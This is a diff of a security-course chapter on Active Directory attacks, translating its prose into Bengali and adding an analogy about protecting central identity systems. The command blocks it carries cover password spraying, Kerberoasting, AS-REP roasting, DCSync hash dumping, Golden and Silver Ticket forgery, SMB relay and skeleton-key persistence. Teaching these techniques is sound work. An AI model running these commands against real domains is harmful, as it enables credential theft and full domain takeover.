@@ -1,9 +1,9 @@
 ---
-title: 'Active Directory Attacks'
-subtitle: 'BloodHound, Kerberoasting, AS-REP Roasting, Pass-the-Ticket, DCSync, Golden Tickets — dominating Windows domains.'
+title: 'অ্যাক্টিভ ডিরেক্টরি অ্যাটাক'
+subtitle: 'BloodHound, Kerberoasting, AS-REP Roasting, Pass-the-Ticket, DCSync, Golden Ticket — Windows ডোমেইন দখলের কৌশল।'
 chapter: 16
 level: 'advanced'
-readingTime: '18 min'
+readingTime: '18 মিনিট'
 topics:
   [
     'Active Directory',
@@ -23,13 +23,21 @@ topics:
 
 <Callout type="info">
 
-**Real-World Analogy**
+**বাস্তব জীবনের উদাহরণ**
 
-Active Directory is a corporate HR database that also controls who can open which door. Compromise AD and you're not just root on one machine — you're the HR director who can fire and hire anyone, unlock any room, and issue any badge.
+Active Directory হলো এমন একটা কর্পোরেট HR ডেটাবেস যেটা একইসাথে নিয়ন্ত্রণ করে কে কোন দরজা খুলতে পারবে। AD কম্প্রোমাইজ করা মানে শুধু একটা মেশিনে root হওয়া না — আপনি হয়ে যাচ্ছেন সেই HR ডিরেক্টর যে যেকাউকে চাকরি দিতে বা বাদ দিতে পারে, যেকোনো রুম আনলক করতে পারে, এবং যেকোনো badge ইস্যু করতে পারে।
 
 </Callout>
 
-## Active Directory Fundamentals
+## গল্পে বুঝি
+
+ফাতিমা আল-ফিহরি একটা বিশাল প্রতিষ্ঠানের সিকিউরিটি চিফ — দশটা বিল্ডিং, হাজারটা দরজা, ল্যাব থেকে সার্ভার রুম সব মিলিয়ে। এত দরজার প্রতিটার আলাদা চাবি বানানো অসম্ভব, তাই পুরো প্রতিষ্ঠানে একটাই কেন্দ্রীয় key-and-badge অফিস। ওই একটা অফিসই ঠিক করে দেয় কোন কর্মীর badge কোন কোন দরজা খুলবে — ইবনে সিনার badge শুধু তার ল্যাব খোলে, আর master control-এর কাছে থাকে সব দরজার নিয়ন্ত্রণ। কেউ যদি ওই কেন্দ্রীয় অফিসটা দখল করে ফেলে, তাহলে সে কোনো একটা রুম না, গোটা প্রতিষ্ঠানের প্রতিটা রুম খুলতে পারে — নতুন badge বানাতে, পুরনো badge বাতিল করতে, যেকোনো দরজা আনলক করতে।
+
+তাই ফাতিমা যেকোনো একটা সার্ভার রুমের চেয়েও অনেক কড়াকড়ি করে ওই কেন্দ্রীয় অফিসটাকেই পাহারা দেন। master control আঙুলে গোনা কয়েকজনের হাতে থাকে, আর সাধারণ কর্মীর রোজকার badge-এর সিস্টেম আর master control-এর সিস্টেম আলাদা রাখা হয় — যাতে একজন সাধারণ কর্মীর badge চুরি হলেও কেউ কেন্দ্রীয় নিয়ন্ত্রণে হাত দিতে না পারে। আল-খোয়ারিজমি যখন শুধু ল্যাবের কাজ করেন, তাকে master control দেওয়ার দরকারই নেই।
+
+এই কেন্দ্রীয় key-and-badge অফিসটাই হলো **Active Directory** — পুরো Windows প্রতিষ্ঠানের central identity আর authentication সিস্টেম, যা ঠিক করে কে কোন মেশিনে ঢুকতে পারবে। ওই একটা অফিস দখল করা মানেই গোটা প্রতিষ্ঠানের প্রতিটা মেশিন দখল — তাই AD-কে crown jewels হিসেবে সবচেয়ে কড়া পাহারায় রাখতে হয়। এর মূল রক্ষাকবচ দুটো: **least privilege** — প্রতিটা account পায় ঠিক ততটুকু access যতটুকু তার কাজে দরকার, বেশি না; আর **tiered admin** — Domain Controller-এর master control আর সাধারণ workstation-এর দৈনন্দিন access কড়াভাবে আলাদা স্তরে রাখা, যাতে একটা সাধারণ মেশিন কম্প্রোমাইজ হলেও attacker সোজা domain-এর নিয়ন্ত্রণে পৌঁছাতে না পারে। বাস্তবে অনেক বড় breach — যেমন র‍্যানসমওয়্যার হামলা — একটা সাধারণ workstation থেকে শুরু হয়ে ধাপে ধাপে Domain Controller পর্যন্ত পৌঁছায়; tiered admin আর least privilege ঠিকমতো থাকলে ওই পথটাই বন্ধ হয়ে যায়।
+
+## Active Directory-র মূল ধারণা
 
 ```
 Domain Controller (DC)    → server running AD DS, the crown jewel
@@ -46,7 +54,7 @@ Key objects:
   SPNs        → Service Principal Names → Kerberoasting targets
 ```
 
-## Initial Enumeration
+## প্রাথমিক এনুমারেশন
 
 ```bash
 # From Linux — enumerate with credentials
@@ -88,9 +96,9 @@ Find-LocalAdminAccess               # where is current user local admin?
 Invoke-ShareFinder                  # find accessible shares
 ```
 
-## BloodHound — Attack Path Mapping
+## BloodHound — অ্যাটাক পাথ ম্যাপিং
 
-BloodHound visualizes attack paths to Domain Admin. It's the most important AD tool.
+BloodHound Domain Admin পর্যন্ত অ্যাটাক পাথ ভিজ্যুয়ালাইজ করে। এটাই সবচেয়ে গুরুত্বপূর্ণ AD টুল।
 
 ```bash
 # Step 1: Collect data with SharpHound (Windows) or BloodHound.py (Linux)
@@ -118,11 +126,11 @@ bloodhound &
 # "Find Computers with Unconstrained Delegation"
 ```
 
-BloodHound shows you the attack path in seconds that would take hours to find manually.
+BloodHound সেকেন্ডের মধ্যে সেই অ্যাটাক পাথ দেখিয়ে দেয় যেটা ম্যানুয়ালি খুঁজতে ঘণ্টার পর ঘণ্টা লাগত।
 
-## Password Spraying
+## পাসওয়ার্ড স্প্রেয়িং
 
-AD environments lock accounts after N failed attempts. Spray slowly.
+AD এনভায়রনমেন্ট N বার ফেইল্ড অ্যাটেম্পটের পর অ্যাকাউন্ট লক করে দেয়। তাই ধীরে স্প্রে করুন।
 
 ```bash
 # CrackMapExec — spray one password across all users
@@ -141,7 +149,7 @@ python3 linkedin2username.py -c 'corp' -n 'Corp Inc' > users.txt
 
 ## Kerberoasting
 
-Service accounts with SPNs have their TGS tickets encrypted with their NTLM hash. Request the ticket, crack offline.
+SPN আছে এমন সার্ভিস অ্যাকাউন্টগুলোর TGS টিকিট তাদের NTLM হ্যাশ দিয়ে এনক্রিপ্ট করা থাকে। টিকিট রিকোয়েস্ট করে অফলাইনে ক্র্যাক করুন।
 
 ```bash
 # From Linux
@@ -161,11 +169,11 @@ Invoke-Kerberoast -OutputFormat Hashcat | fl hash
 .\Rubeus.exe kerberoast /format:hashcat /output:hashes.txt
 ```
 
-**Why it works:** Any domain user can request TGS tickets for any SPN. The ticket is encrypted with the service account's password hash. If the service account has a weak password, you crack it offline.
+**কেন এটা কাজ করে:** যেকোনো ডোমেইন ইউজার যেকোনো SPN-এর জন্য TGS টিকিট রিকোয়েস্ট করতে পারে। টিকিটটা সার্ভিস অ্যাকাউন্টের পাসওয়ার্ড হ্যাশ দিয়ে এনক্রিপ্ট করা থাকে। সার্ভিস অ্যাকাউন্টের পাসওয়ার্ড দুর্বল হলে সেটা আপনি অফলাইনে ক্র্যাক করতে পারবেন।
 
 ## AS-REP Roasting
 
-Accounts with "Do not require Kerberos pre-authentication" enabled skip the pre-auth step — you can request their AS-REP and crack it offline. No credentials needed.
+যেসব অ্যাকাউন্টে "Do not require Kerberos pre-authentication" এনাবল করা থাকে, তারা pre-auth স্টেপ স্কিপ করে — তাদের AS-REP রিকোয়েস্ট করে অফলাইনে ক্র্যাক করা যায়। কোনো ক্রেডেনশিয়াল লাগে না।
 
 ```bash
 # Find accounts without pre-auth (from Linux, no creds needed)
@@ -216,9 +224,9 @@ export KRB5CCNAME=ticket.ccache
 python3 /usr/share/doc/python3-impacket/examples/psexec.py -k -no-pass corp.local/user@DC01
 ```
 
-## DCSync — Dump All Domain Hashes
+## DCSync — সব ডোমেইন হ্যাশ ডাম্প করা
 
-With `Replicating Directory Changes` rights (Domain Admin, or explicitly granted), you can pull all password hashes from the DC as if you were another DC doing replication.
+`Replicating Directory Changes` রাইট থাকলে (Domain Admin, বা এক্সপ্লিসিটলি গ্র্যান্টেড), আপনি DC থেকে সব পাসওয়ার্ড হ্যাশ পুল করতে পারবেন, যেন আপনি রেপ্লিকেশন করা আরেকটা DC।
 
 ```bash
 # From Linux
@@ -236,7 +244,7 @@ lsadump::dcsync /domain:corp.local /all /csv   # all users
 
 ## Golden Ticket
 
-With the `krbtgt` NTLM hash (from DCSync), forge Kerberos TGTs for any user, even nonexistent ones. Valid until krbtgt password changes (most organizations never change it).
+`krbtgt`-র NTLM হ্যাশ থাকলে (DCSync থেকে পাওয়া), যেকোনো ইউজারের জন্য — এমনকি যে অস্তিত্বই নেই তার জন্যও — Kerberos TGT ফোর্জ করা যায়। krbtgt পাসওয়ার্ড না পাল্টানো পর্যন্ত এটা ভ্যালিড থাকে (বেশিরভাগ প্রতিষ্ঠান এটা কখনোই পাল্টায় না)।
 
 ```bash
 # Requirements:
@@ -257,7 +265,7 @@ dir \\DC01\C$   # access domain controller share
 
 ## Silver Ticket
 
-Forge TGS tickets for specific services using the service account hash — more targeted, less logged than Golden Ticket.
+সার্ভিস অ্যাকাউন্ট হ্যাশ দিয়ে নির্দিষ্ট সার্ভিসের জন্য TGS টিকিট ফোর্জ করা — Golden Ticket-এর চেয়ে বেশি টার্গেটেড, কম লগড।
 
 ```bash
 # Requirements: service account NTLM hash (from Kerberoasting, credentials, or DCSync)
@@ -271,9 +279,9 @@ kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... \
 dir \\fileserver.corp.local\C$
 ```
 
-## SMB Relay Attack
+## SMB Relay অ্যাটাক
 
-Instead of cracking NTLMv2 hashes from Responder, relay them directly:
+Responder থেকে পাওয়া NTLMv2 হ্যাশ ক্র্যাক করার বদলে সরাসরি রিলে করুন:
 
 ```bash
 # Requirements:
@@ -302,7 +310,7 @@ python3 ntlmrelayx.py -tf relay-targets.txt -smb2support -i
 # Connect to relay shell: nc 127.0.0.1 11000
 ```
 
-## Attacking GPOs
+## GPO অ্যাটাক করা
 
 ```powershell
 # Find GPOs you can modify
@@ -317,7 +325,7 @@ Get-DomainGPO | Get-ObjectACL -ResolveGUIDs |
   --GPOName "Default Domain Policy"
 ```
 
-## Persistence in AD
+## AD-এ Persistence
 
 ```powershell
 # AdminSDHolder — objects in AdminSDHolder propagate ACLs to protected groups
@@ -338,7 +346,7 @@ misc::skeleton
 # Now: any user can auth with "mimikatz" as password
 ```
 
-## Real Project: AD Lab Setup
+## রিয়েল প্রজেক্ট: AD ল্যাব সেটআপ
 
 ```bash
 # Vulnerable AD lab: GOAD (Game of Active Directory)
